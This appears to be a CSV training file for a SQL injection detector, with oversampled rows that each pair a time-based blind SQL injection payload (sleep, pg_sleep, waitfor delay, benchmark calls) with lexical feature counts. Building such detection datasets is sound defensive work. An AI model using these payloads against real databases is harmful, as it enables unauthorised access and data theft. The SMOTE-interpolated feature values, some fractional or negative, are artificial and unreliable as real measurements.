id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000032,attack,time,1'+  (  select 'toec' where 5810  =  5810 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000309,0.9813255993714801,68.39384470823457,24.628847057353394,3.6861150418238786,23.0,10.0,25.04538353117593,10.348461177058642,0.33734441576360497,0.14667148511461084,0.3649873515741465,0.15099674754763767,3.6742305885293214,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.674230588529321,0.0,0.0,0.0,2.674230588529321,1.0,0.0,0.0,0.32576941147067895,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000033,attack,time,select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,nearest_attack_euclidean,R000173,0.055773967112991416,52.84052851836841,18.940198194388152,3.520075214665955,27.960132129592104,1.0,16.920264259184208,6.960132129592102,0.5292881359975119,0.018934788881187242,0.3201195056287211,0.1316575694925797,3.0,0.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.980066064796051,0.0,0.9800660647960513,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.019933935203948705,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.019933935203949
SMOTE_000034,attack,time,1   )    )    as emtf where 3561  =  3561 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000751,1.1142652048419484,111.93728335047463,26.415453920560317,3.3300670436565496,36.753638238319056,10.0,52.01455295327621,13.16909215887937,0.3292194911057778,0.08985229580616688,0.4632811542645259,0.11764705882352941,0.0,0.0,2.0,0.0,1.0,1.0,0.0,9.16909215887937,0.0,0.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.5845460794396844,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.584546079439685
SMOTE_000035,attack,time,select sleep  (  5  )   and   (  'dcys' like 'dcys,nearest_attack_euclidean,R000135,0.1924065532247817,51.0665938001566,17.30474108575903,3.3872897237157242,26.0,1.0,17.914223257277087,6.152370542879514,0.5102696705950626,0.01962575656134856,0.3496768660565587,0.12042770678703021,3.0,0.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,3.1523705428795146,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000036,attack,time,1'   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000194,0.07005959951399549,35.456426489359096,13.0,2.453316194899493,7.0,2.0,20.365141191487275,6.091285297871818,0.19771786755320456,0.05649081930091558,0.5740367227963377,0.1717545903495422,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,4.091285297871819,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000037,attack,time,"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000155,0.9833493946452104,61.75098580929768,22.58366193643256,3.46689016829107,19.0,10.0,26.167323872865122,6.583661936432561,0.3078654152442709,0.16203442907593205,0.4236150230527686,0.10648513262702847,0.0,0.583661936432561,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.0,0.0,1.0,0.0,1.0,0.0,0.583661936432561,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000038,attack,time,1 where 1931  =  1931 and sleep  (  5  )  --,nearest_attack_euclidean,R000727,0.36097684800064395,44.166272641394166,19.0,3.41344045495648,13.0,10.0,16.0,5.166272641394158,0.29436285639488685,0.22643296645760524,0.3622927463321684,0.11691143081533949,0.16627264139415865,0.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,0.0,3.0,0.16627264139415876,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000039,attack,time,"1'  )   as khaa where 8157  =  8157 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000604,0.6897457818320097,98.64982912686689,28.282106241471475,3.833287685607837,25.80351040245246,28.521404160980985,34.56421248294295,9.760702080490493,0.26118679530133077,0.2896989950691756,0.35006192342836157,0.09905228620113204,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.760702080490492,0.0,0.0,1.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.7607020804904918,0.23929791950950804,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000040,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'--,nearest_attack_euclidean,R000627,0.8395031344440103,41.8777148710064,21.096067330177597,4.028690560940405,21.082958430769594,4.0,9.0960673301776,7.6986891100592,0.4921674996248306,0.09963768830920172,0.21896313177892426,0.18923168028704343,2.6986891100592,0.0,2.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000041,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  4968  =  4968,nearest_attack_euclidean,R000533,0.7195243350942235,107.21868867893636,26.828033018404547,3.22126987958597,32.21868867893636,10.0,53.0,12.0,0.30043690172259147,0.09327507977032114,0.494357922782702,0.11193009572438536,0.0,0.0,0.0,0.0,1.0,1.0,0.0,10.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.3906556605318183,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.390655660531818
SMOTE_000042,attack,time,1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R000388,0.45887000145885953,100.0,25.146903565475743,3.3533621968067733,32.0,10.0,45.0,13.0,0.32,0.1,0.45,0.13,0.853096434524258,0.14690356547574202,2.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,4.0,0.853096434524258,0.14690356547574202,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000043,attack,time,"1%""  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000218,0.5633301723694861,72.30566942670379,24.717611571117295,3.620608233358921,17.0,19.0,26.87044628446919,9.435223142234594,0.23545381950437913,0.2631542688578355,0.37119520689646546,0.13019670474131997,0.0,1.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.717611571117297,0.7176115711172969,0.0,1.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000044,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000282,0.0982328270125219,51.0,23.225189956098017,3.770284005533321,15.0,11.225189956098017,17.774810043901983,7.0,0.29411764705882354,0.2201017638450592,0.348525687135333,0.13725490196078433,2.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,2.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000045,attack,time,1'  )   and sleep  (  5  )   and   (  'njud'  =  'njud,nearest_attack_euclidean,R000352,0.7716176645448232,59.58285234954167,17.601224832175596,3.0391861386991184,19.0,2.0,28.785302013892856,9.79755033564881,0.3229645439430034,0.03399626778347403,0.4783273018412893,0.1647118864322333,4.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.797550335648809,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000046,attack,time,1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000189,0.3226487170841899,90.32893500444453,23.0,2.9614570879353095,30.0,2.0,46.774112503703776,11.554822500740755,0.3332181003407227,0.02221454002271485,0.5167761380096467,0.1277912216269157,0.0,0.0,0.0,0.0,1.0,-1.1102230246251565e-16,0.0,9.554822500740755,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000047,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  6824  =  6824,nearest_attack_euclidean,R000511,1.010893660859028,113.17768357821774,25.897210447277217,3.1064999900528587,31.897210447277217,10.0,58.38326268366329,12.897210447277216,0.28260099880038936,0.08878929509881092,0.5147083679881511,0.11390133811264863,0.0,0.0,0.0,0.0,1.0,1.0,0.0,10.897210447277217,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.5513947763613922,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.551394776361392
SMOTE_000048,attack,time,1%'   )    )    and sleep  (  5  )  #,nearest_attack_euclidean,R000385,0.617903361207523,38.205185986579565,14.698703503355109,2.6120904552165523,7.999999999999998,2.0,21.205185986579565,7.0,0.20986058807341035,0.05246514701835259,0.554046250344003,0.18362801456423405,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,4.301296496644891,0.6987035033551088,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000049,attack,time,1 waitfor delay '0:0:5'# opyp,nearest_attack_euclidean,R000701,0.2574124637150425,28.347646068817745,19.326176965591127,4.134929865014731,16.0,3.6738230344088736,3.6738230344088727,5.0,0.56505448646094,0.1291829932600081,0.1291829932600081,0.17657952701904378,2.0,0.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000050,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000087,0.3998255730982507,94.73625025251539,23.368125126257695,3.313540555253078,37.368125126257695,1.2736250252515386,42.820875075754614,13.273625025251539,0.39422021552910846,0.013260576733868948,0.45232288963808376,0.1401963180989388,3.2736250252515386,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000051,attack,time,1 where 7452  =  7452 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000465,0.19304019912753342,86.15428383369057,25.430856766738113,3.592779628636912,24.646285150107172,18.0,34.292570300214344,9.215428383369057,0.2860102038233091,0.20984694265036283,0.3971479554379826,0.10699489808834542,0.0,0.0,2.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.215428383369057,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000052,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,7.676424279759529,69.75442415228508,28.59900431290805,4.05646185108286,26.577709919688516,4.299502156454025,22.577709919688516,16.299502156454025,0.37576101137039397,0.056743010586228854,0.3082650333270167,0.25923094471636043,2.0,0.540099568709195,2.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.9999999999999999,3.83960172516322,0.0,2.1603982748367803,0.9198008625816102,2.91980086258161,1.0,0.540099568709195,1.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.45990043129080505,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.459900431290805,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.91980086258161
SMOTE_000053,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,0.0033129540767814587,86.97516478089481,28.0,3.4843948808228684,16.0,21.0,37.98013182471585,11.995032956178962,0.18396374593575598,0.2414524165406797,0.436671601776882,0.13791223574668238,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,6.995032956178963,1.0,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000054,attack,time,"1"" or sleep  (  5  )  ",nearest_attack_euclidean,R000577,0.050344634582886114,22.0584187129798,12.019472904326596,2.862183680695934,7.0584187129797975,2.0,10.0,3.0,0.3197750558085399,0.09069665922552801,0.45348329612764005,0.13604498883829202,0.0,1.0,0.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9805270956734012,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9805270956734013
SMOTE_000055,attack,time,"1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000380,0.09656469643360598,72.0,23.303500159553423,3.514730825508946,17.12140006382137,19.12140006382137,27.817899904267946,7.9392999680893155,0.2377972231086301,0.2655750008864079,0.3863597208926104,0.1102680551123516,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,4.9392999680893155,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000056,attack,time,"1'  )   as khaa where 8157  =  8157 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000604,0.6867124340439983,98.66456242959252,28.285263377769827,3.8334139881730884,25.808772296283042,28.52350891851322,34.570526755539646,9.761754459256608,0.261202271459656,0.2896753118571931,0.35007458573971856,0.09904783094343236,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,2.0,0.0,4.761754459256608,0.0,0.0,1.0,2.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.7617544592566082,0.23824554074339183,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000057,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R000418,0.13458344833473534,62.680702797222374,23.736140559444475,3.4520083713081373,18.60421083916671,10.0,27.208421678333423,6.868070279722238,0.29678129991457547,0.16093500427122737,0.4326275955579235,0.10965610025627365,1.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.8680702797222373,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000058,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,7.190333697624945,38.60733576702637,22.651833941756593,4.047940758855008,14.202445255675457,2.8987773721622716,9.753056569594321,11.753056569594321,0.368743053250922,0.08120137275645399,0.2484704970581205,0.30158507693450354,2.0,1.0,2.0,0.0,-2.7755575615628914e-17,-1.1102230246251565e-16,0.550611313918864,1.5506113139188642,0.4493886860811359,2.2024452556754563,0.0,2.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.550611313918864,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000059,attack,time,1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,nearest_attack_euclidean,R000074,1.4526256122007388,67.57685934558144,25.61859505453488,3.808269000130111,23.14421483639536,10.0,23.28842967279072,11.144214836395358,0.3431523024529346,0.14904368392469536,0.3435041318790698,0.16429988174330015,3.38140494546512,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,3.38140494546512,0.0,0.0,0.0,3.762809890930239,1.0,0.0,0.0,0.6185950545348804,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.6185950545348804,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6185950545348806
SMOTE_000060,attack,time,"1""   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  ""hiwo"" like ""hiwo",nearest_attack_euclidean,R000545,0.35518517949068734,120.11321526178688,29.288678473821314,3.521641596755124,30.0,21.0,53.690572209429504,15.422643052357376,0.2501333579499528,0.17509335056496694,0.4464781874307334,0.12829510405434688,0.0,4.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,9.422643052357376,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000061,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'dvpw'  =  'dvpw",nearest_attack_euclidean,R000767,0.2212673613063502,84.30952449282753,28.802721283665008,3.9204732448522064,30.210885134660032,15.0,29.0,10.098639358167496,0.3578174927855881,0.17803275001622731,0.3441966500313728,0.11995310716681175,3.0,0.0,0.0,0.0,-2.7755575615628914e-17,1.0,0.0,5.0,0.09863935816749603,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000062,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000106,0.03590081595264816,70.01980932403538,23.01980932403537,3.3828125285713573,19.0,10.0,31.0,10.019809324035371,0.2713528416183758,0.14281728506230307,0.44273358369313953,0.14309628962618154,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,5.0,0.019809324035371195,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000063,attack,time,"1""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000379,0.010039118349835114,77.92303937124157,26.0,3.3449218744623037,20.0,10.0,36.934033746778496,10.989005624463083,0.2566881929532626,0.1283440964766313,0.47394405480548646,0.14102365576461956,0.0,1.0,2.0,0.0,-2.7755575615628914e-17,1.0,0.0,5.989005624463083,0.0,1.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
